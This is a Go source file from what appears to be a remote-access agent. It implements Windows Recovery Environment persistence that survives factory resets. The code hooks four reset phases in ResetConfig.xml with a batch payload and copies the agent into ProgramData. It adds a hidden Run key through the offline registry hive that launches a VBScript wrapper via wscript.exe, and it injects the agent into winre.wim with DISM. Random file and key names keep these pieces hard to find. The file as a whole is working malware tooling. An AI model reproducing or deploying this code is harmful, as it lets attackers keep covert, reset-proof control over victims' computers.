//go:build windows && overlord_winre
// +build windows,overlord_winre

package handlers

// WinRE persistence — improved Layer 2 persistence.
//
// Improvements over original:
//  1. crypto/rand names — unpredictable file/key names.
//  2. 4 phases — BasicReset and FactoryReset, each Before+AfterImageApply.
//     If any one phase fires, persistence is restored.
//  3. Run key (not RunOnce) — survives multiple Windows resets in a row.
//  4. LOLBin launcher — Run key points to wscript.exe + .vbs, not .exe directly.
//  5. Copies payload to ProgramData — OEM dir is wiped on factory reset;
//     ProgramData survives.
//  6. Machine-GUID-derived backup dir — stable across reboots, unique per host,
//     not a static identifiable string.
//  7. Careful uninstall — restores original ResetConfig.xml, removes only own
//     files (does not clobber manufacturer OEM data).
//  8. WIM injection (non-fatal) — injects into winre.wim so persistence
//     survives factory reset even when ProgramData is wiped.

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/xml"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"overlord-client/cmd/agent/runtime"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	winreOEMRelPath     = `Recovery\OEM`
	winreResetConfigXML = "ResetConfig.xml"
	winreDeleteManifest = "DELETEME"
	winreConfigBackup   = "configBackup"
)

// ────────────────────────────────────────────────────────────────────────────
// Crypto-random naming

func randomCryptName(n int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	out := make([]byte, n)
	for i, v := range b {
		out[i] = charset[int(v)%len(charset)]
	}
	return string(out)
}

// backupDirName returns a machine-unique, deterministic backup directory name
// derived from the Windows MachineGuid so we can always find it at uninstall time.
func backupDirName() string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Cryptography`, registry.QUERY_VALUE)
	if err != nil {
		return "B" + randomCryptName(15) // non-deterministic fallback
	}
	defer k.Close()
	guid, _, err := k.GetStringValue("MachineGuid")
	if err != nil {
		return "B" + randomCryptName(15)
	}
	h := sha256.Sum256([]byte(guid + "winre-backup-v1"))
	return hex.EncodeToString(h[:8]) // stable 16-char hex
}

// ────────────────────────────────────────────────────────────────────────────
// Path helpers

func systemDrive() string {
	sd := os.Getenv("SystemDrive")
	if sd == "" {
		sd = "C:"
	}
	return sd
}

func oemPath() string {
	return filepath.Join(systemDrive()+`\`, winreOEMRelPath)
}

func backupPath() string {
	return filepath.Join(oemPath(), backupDirName())
}

func resetConfigPath() string {
	return filepath.Join(oemPath(), winreResetConfigXML)
}

// ────────────────────────────────────────────────────────────────────────────
// ResetConfig XML

type resetConfig struct {
	XMLName xml.Name   `xml:"Reset"`
	Runs    []runEntry `xml:"Run"`
}

type runEntry struct {
	XMLName  xml.Name `xml:"Run"`
	Phase    string   `xml:"Phase,attr"`
	Path     string   `xml:"Path"`
	Duration int      `xml:"Duration"`
	Param    string   `xml:"Param,omitempty"`
}

// allPhases are the four WinRE hook points we install into.
// Covering Before+After × Basic+Factory maximises the chance of at least one
// firing even when the reset aborts partway through.
var allPhases = [4]string{
	"BasicReset_BeforeImageApply",
	"BasicReset_AfterImageApply",
	"FactoryReset_BeforeImageApply",
	"FactoryReset_AfterImageApply",
}

// ────────────────────────────────────────────────────────────────────────────
// Payload generation

// createPayload returns a .bat script that, when run in WinRE:
//  1. Resolves the target OS drive letter.
//  2. Copies the agent and the VBS launcher to ProgramData on that drive —
//     so they survive even if Recovery\OEM is cleaned up later.
//  3. Loads the offline SOFTWARE hive and adds a Run key pointing to
//     wscript.exe + the VBS launcher (LOLBin approach: no bare .exe in Run).
func createPayload(agentName, vbsName, dstDir string) string {
	rndKey := randomCryptName(20)
	appName := randomCryptName(10)
	// %%%%A  →  %%A  (Go fmt.Sprintf) → %A (batch FOR variable)
	// %%X%%  →  %X%  (Go fmt.Sprintf) → env-var expansion in batch
	return fmt.Sprintf(`@echo off
for /F "tokens=1,2,3 delims= " %%%%A in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RecoveryEnvironment" /v TargetOS') DO SET TARGETOS=%%%%C
for /F "tokens=1 delims=\" %%%%A in ('Echo %%TARGETOS%%') DO SET TARGETOSDRIVE=%%%%A

if not exist "%%TARGETOSDRIVE%%\ProgramData\%s\" md "%%TARGETOSDRIVE%%\ProgramData\%s\" >nul 2>&1
copy /Y "%%TARGETOSDRIVE%%\Recovery\OEM\%s" "%%TARGETOSDRIVE%%\ProgramData\%s\%s" >nul 2>&1
copy /Y "%%TARGETOSDRIVE%%\Recovery\OEM\%s" "%%TARGETOSDRIVE%%\ProgramData\%s\%s" >nul 2>&1

reg load HKLM\%s %%TARGETOSDRIVE%%\windows\system32\config\SOFTWARE
reg add "HKLM\%s\Microsoft\Windows\CurrentVersion\Run" /v %s /t REG_SZ /d "wscript.exe //B //NoLogo %%TARGETOSDRIVE%%\ProgramData\%s\%s" /f
reg unload HKLM\%s
`,
		dstDir, dstDir,
		agentName, dstDir, agentName,
		vbsName, dstDir, vbsName,
		rndKey,
		rndKey, appName, dstDir, vbsName,
		rndKey,
	)
}

// createVBSLauncher generates a VBScript that silently launches the agent.
// It runs in the normal Windows session (via the Run key) so %SystemDrive%
// is available through WScript.Shell.ExpandEnvironmentStrings.
func createVBSLauncher(dstDir, agentName string) string {
	return fmt.Sprintf(`Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
Dim drv, agentPath
drv = oShell.ExpandEnvironmentStrings("%%SystemDrive%%")
agentPath = drv & "\ProgramData\%s\%s"
If oFSO.FileExists(agentPath) Then
    oShell.Run Chr(34) & agentPath & Chr(34), 0, False
End If
`, dstDir, agentName)
}

// ────────────────────────────────────────────────────────────────────────────
// OEM directory setup

func createOEMEnvironment() error {
	if err := os.MkdirAll(oemPath(), 0o755); err != nil {
		return fmt.Errorf("failed to create OEM directory: %w", err)
	}
	if err := os.MkdirAll(backupPath(), 0o755); err != nil {
		return fmt.Errorf("failed to create backup directory: %w", err)
	}
	return nil
}

// backupCurrentConfig saves the list of files we created and a copy of any
// pre-existing ResetConfig.xml so uninstall can restore the original state.
func backupCurrentConfig(scriptNames []string, extraFiles []string) error {
	all := append(append([]string{}, scriptNames...), extraFiles...)
	content := strings.Join(all, "\n")
	if err := os.WriteFile(filepath.Join(backupPath(), winreDeleteManifest),
		[]byte(content), 0o644); err != nil {
		return err
	}
	if data, err := os.ReadFile(resetConfigPath()); err == nil {
		os.WriteFile(filepath.Join(backupPath(), winreConfigBackup), data, 0o644)
	}
	return nil
}

func saveScriptFile(name, content string) error {
	return os.WriteFile(filepath.Join(oemPath(), name), []byte(content), 0o644)
}

// ────────────────────────────────────────────────────────────────────────────
// ResetConfig.xml writing

// buildResetConfig creates a new resetConfig with our 4 phases.
// basic and factory bat files are the same content; they're named separately
// so the installer can register both independently.
func buildResetConfig(basicName, factoryName string) resetConfig {
	return resetConfig{
		Runs: []runEntry{
			{Phase: allPhases[0], Path: basicName, Duration: 1},
			{Phase: allPhases[1], Path: basicName, Duration: 1},
			{Phase: allPhases[2], Path: factoryName, Duration: 1},
			{Phase: allPhases[3], Path: factoryName, Duration: 1},
		},
	}
}

func writeResetConfig(cfg resetConfig) error {
	data, err := xml.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(resetConfigPath(), []byte(xml.Header+string(data)), 0o644)
}

func createNewResetConfig(basicName, factoryName, payload string) error {
	if err := writeResetConfig(buildResetConfig(basicName, factoryName)); err != nil {
		return err
	}
	if err := saveScriptFile(basicName, payload); err != nil {
		return err
	}
	return saveScriptFile(factoryName, payload)
}

func updateExistingResetConfig(basicName, factoryName, payload string) error {
	data, err := os.ReadFile(resetConfigPath())
	if err != nil {
		return err
	}
	var cfg resetConfig
	if err := xml.Unmarshal(data, &cfg); err != nil {
		return err
	}

	maxDur := 1
	for _, r := range cfg.Runs {
		if r.Duration > maxDur {
			maxDur = r.Duration
		}
	}

	// For each of our 4 phases: if it already exists, chain the old script as an
	// extra call at the bottom of ours; otherwise append a new entry.
	phaseFiles := map[string]string{
		allPhases[0]: basicName, allPhases[1]: basicName,
		allPhases[2]: factoryName, allPhases[3]: factoryName,
	}
	extraBasic := ""
	extraFactory := ""

	for i, run := range cfg.Runs {
		fileName, ok := phaseFiles[run.Phase]
		if !ok {
			continue
		}
		// Chain the previous script
		oldCall := `"` + `%TARGETOSDRIVE%\Recovery\OEM\` + run.Path + `"`
		if run.Param != "" {
			oldCall += " " + run.Param
		}
		if fileName == basicName {
			extraBasic += oldCall + "\n"
		} else {
			extraFactory += oldCall + "\n"
		}
		cfg.Runs[i].Path = fileName
		cfg.Runs[i].Param = ""
		delete(phaseFiles, run.Phase)
	}

	// Add any phases that weren't present
	for phase, file := range phaseFiles {
		cfg.Runs = append(cfg.Runs, runEntry{Phase: phase, Path: file, Duration: maxDur})
	}

	if err := writeResetConfig(cfg); err != nil {
		return err
	}
	if err := saveScriptFile(basicName, payload+extraBasic); err != nil {
		return err
	}
	return saveScriptFile(factoryName, payload+extraFactory)
}

// ────────────────────────────────────────────────────────────────────────────
// WIM injection (belt-and-suspenders: non-fatal if DISM unavailable)

func findWinREWIMPath() (string, error) {
	out, err := exec.Command("reagentc.exe", "/info").Output()
	if err != nil {
		return "", fmt.Errorf("reagentc failed: %w", err)
	}
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(strings.ToLower(line), "windows re location") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) < 2 {
				continue
			}
			loc := strings.TrimSpace(parts[1])
			// Reagentc outputs something like:
			//   \\?\GLOBALROOT\device\harddisk0\partition1\Recovery\WindowsRE
			// Strip the drive prefix ambiguity and try both forms.
			wimPath := strings.TrimRight(loc, `\`) + `\winre.wim`
			if _, err := os.Stat(wimPath); err == nil {
				return wimPath, nil
			}
			// Try with the actual system path
			reimgDir := filepath.Join(systemDrive()+`\`, `Recovery\WindowsRE`)
			alt := filepath.Join(reimgDir, "winre.wim")
			if _, err := os.Stat(alt); err == nil {
				return alt, nil
			}
		}
	}
	return "", fmt.Errorf("WinRE WIM not found in reagentc output")
}

func injectIntoWinREWIM(fileBytes []byte, agentName, vbsContent, dstDir, vbsName string) error {
	wimPath, err := findWinREWIMPath()
	if err != nil {
		return err
	}

	mountDir, err := os.MkdirTemp("", "winre_mount_")
	if err != nil {
		return err
	}

	mounted := false
	defer func() {
		if mounted {
			exec.Command("dism.exe", "/Unmount-WIM", "/MountDir:"+mountDir, "/Discard").Run()
		}
		os.RemoveAll(mountDir)
	}()

	if err := exec.Command("dism.exe",
		"/Mount-WIM", "/WimFile:"+wimPath,
		"/MountDir:"+mountDir, "/Index:1").Run(); err != nil {
		return fmt.Errorf("DISM /Mount-WIM failed: %w", err)
	}
	mounted = true

	// Write payload files under ProgramData inside the WIM
	targetDir := filepath.Join(mountDir, "ProgramData", dstDir)
	if err := os.MkdirAll(targetDir, 0o755); err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(targetDir, agentName), fileBytes, 0o644); err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(targetDir, vbsName), []byte(vbsContent), 0o644); err != nil {
		return err
	}

	// Add Run key in offline SOFTWARE hive
	softHive := filepath.Join(mountDir, "Windows", "System32", "config", "SOFTWARE")
	rndKey := randomCryptName(20)
	appName := randomCryptName(10)
	runVal := fmt.Sprintf(`wscript.exe //B //NoLogo %%SystemDrive%%\ProgramData\%s\%s`, dstDir, vbsName)

	exec.Command("reg", "load", `HKLM\`+rndKey, softHive).Run()
	exec.Command("reg", "add",
		fmt.Sprintf(`HKLM\%s\Microsoft\Windows\CurrentVersion\Run`, rndKey),
		"/v", appName, "/t", "REG_EXPAND_SZ", "/d", runVal, "/f").Run()
	exec.Command("reg", "unload", `HKLM\`+rndKey).Run()

	// Commit
	if err := exec.Command("dism.exe",
		"/Unmount-WIM", "/MountDir:"+mountDir, "/Commit").Run(); err != nil {
		return fmt.Errorf("DISM /Commit failed: %w", err)
	}
	mounted = false
	return nil
}

// ────────────────────────────────────────────────────────────────────────────
// Install / Uninstall

func installWinREPersistence(fileBytes []byte, ext string) error {
	_ = uninstallWinREPersistence()

	if err := createOEMEnvironment(); err != nil {
		return err
	}

	// Randomise all names
	agentName := randomCryptName(20) + ext
	vbsName := randomCryptName(20) + ".vbs"
	dstDir := randomCryptName(12) // ProgramData sub-directory
	basicBat := randomCryptName(20) + ".bat"
	factoryBat := randomCryptName(20) + ".bat"

	// Write agent to OEM dir
	if err := os.WriteFile(filepath.Join(oemPath(), agentName),
		fileBytes, 0o644); err != nil {
		return fmt.Errorf("failed to write agent stub: %w", err)
	}

	// Write VBS launcher to OEM dir
	vbsContent := createVBSLauncher(dstDir, agentName)
	if err := os.WriteFile(filepath.Join(oemPath(), vbsName),
		[]byte(vbsContent), 0o644); err != nil {
		return fmt.Errorf("failed to write VBS launcher: %w", err)
	}

	payload := createPayload(agentName, vbsName, dstDir)

	if err := backupCurrentConfig(
		[]string{basicBat, factoryBat},
		[]string{agentName, vbsName},
	); err != nil {
		log.Printf("winre: backup warning: %v", err)
	}

	rcPath := resetConfigPath()
	if _, err := os.Stat(rcPath); os.IsNotExist(err) {
		if err := createNewResetConfig(basicBat, factoryBat, payload); err != nil {
			return err
		}
	} else {
		if err := updateExistingResetConfig(basicBat, factoryBat, payload); err != nil {
			return err
		}
	}

	// WIM injection — non-fatal, logged only
	if err := injectIntoWinREWIM(fileBytes, agentName, vbsContent, dstDir, vbsName); err != nil {
		log.Printf("winre: WIM injection skipped (%v) — OEM dir persistence still active", err)
	} else {
		log.Printf("winre: WIM injection successful")
	}

	return nil
}

func uninstallWinREPersistence() error {
	bk := backupPath()
	if _, err := os.Stat(bk); os.IsNotExist(err) {
		return fmt.Errorf("WinRE persistence not installed")
	}

	oem := oemPath()
	manifestPath := filepath.Join(bk, winreDeleteManifest)
	manifestData, err := os.ReadFile(manifestPath)
	if err != nil {
		// Fallback: remove the whole OEM dir (old-style install)
		return os.RemoveAll(oem)
	}

	// Remove only our own files
	for _, name := range strings.Split(strings.TrimSpace(string(manifestData)), "\n") {
		name = strings.TrimSpace(name)
		if name != "" {
			os.Remove(filepath.Join(oem, name))
		}
	}

	// Restore original ResetConfig.xml (or delete ours if there was none)
	backupCfg := filepath.Join(bk, winreConfigBackup)
	if data, err := os.ReadFile(backupCfg); err == nil {
		os.WriteFile(resetConfigPath(), data, 0o644)
	} else {
		os.Remove(resetConfigPath())
	}

	os.RemoveAll(bk)
	return nil
}

// ────────────────────────────────────────────────────────────────────────────
// Handler functions (called from command dispatcher)

func handleWinREInstall(ctx context.Context, env *runtime.Env, cmdID string, filePath string, useSelf bool) error {
	if !windows.GetCurrentProcessToken().IsElevated() {
		return fmt.Errorf("WinRE persistence requires administrator privileges")
	}

	var fileBytes []byte
	var ext string

	if useSelf {
		exePath, err := os.Executable()
		if err != nil {
			return fmt.Errorf("failed to get executable path: %w", err)
		}
		fileBytes, err = os.ReadFile(exePath)
		if err != nil {
			return fmt.Errorf("failed to read self executable: %w", err)
		}
		ext = filepath.Ext(exePath)
		if ext == "" {
			ext = ".exe"
		}
	} else {
		if filePath == "" {
			return fmt.Errorf("missing filePath")
		}
		// Wait up to 15s for the file to appear (e.g. if it was just uploaded)
		deadline := time.Now().Add(15 * time.Second)
		for time.Now().Before(deadline) {
			if _, err := os.Stat(filePath); err == nil {
				break
			}
			time.Sleep(500 * time.Millisecond)
		}
		var err error
		fileBytes, err = os.ReadFile(filePath)
		if err != nil {
			return fmt.Errorf("failed to read file: %w", err)
		}
		ext = filepath.Ext(filePath)
		if ext == "" {
			ext = ".exe"
		}
	}

	return installWinREPersistence(fileBytes, ext)
}

func handleWinREUninstall(ctx context.Context, env *runtime.Env, cmdID string) error {
	if !windows.GetCurrentProcessToken().IsElevated() {
		return fmt.Errorf("WinRE uninstall requires administrator privileges")
	}
	return uninstallWinREPersistence()
}

func WinRESupported() bool {
	return true
}
